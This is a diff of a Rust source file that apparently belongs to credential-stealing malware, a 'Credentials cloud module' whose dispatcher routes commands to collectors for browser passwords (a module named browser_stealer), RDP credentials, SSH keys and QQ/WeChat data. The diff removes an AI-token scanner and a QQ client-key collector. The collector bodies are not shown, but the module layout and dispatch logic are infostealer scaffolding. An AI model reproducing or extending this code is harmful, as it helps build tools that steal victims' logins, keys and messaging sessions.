@@ -1,12 +1,10 @@
-//! Credentials cloud module 鈥?browsers, RDP, SSH, AI tokens, QQ/WeChat.
+//! Credentials cloud module 鈥?browsers, RDP, SSH, QQ/WeChat.
 #![allow(non_snake_case)]
 #![allow(clippy::upper_case_acronyms)]
 
 mod browser_stealer;
 mod rdp_creds;
 mod ssh_keys;
-mod ai_token_scanner;
-mod qq_clientkey;
 mod other_software;
 
 use serde_json::Value;
@@ -51,20 +49,10 @@ fn dispatch(input: &str) -> String {
         }
         "wechat" => other_software::OtherSoftware::collect_wechat(),
         "qq" => other_software::OtherSoftware::collect_qq(),
-        "ai" => ai_token_scanner::AITokenScanner::scan(),
         "ssh" => ssh_keys::SshKeys::collect(),
         "rdp" => rdp_creds::RdpCreds::collect(),
-        "qq_clientkey" => run_async(qq_clientkey::QQClientKey::collect()),
         _ => format!(r#"{{"error":"unknown creds op '{}'"}}"#, op),
     }
-}
-
-fn run_async<F: std::future::Future<Output = String>>(f: F) -> String {
-    tokio::runtime::Builder::new_current_thread()
-        .enable_all()
-        .build()
-        .map(|rt| rt.block_on(f))
-        .unwrap_or_else(|e| format!(r#"{{"error":"runtime: {}"}}"#, e))
 }
 
 fn write_output(s: &str, output: *mut u8, output_cap: usize) -> usize {
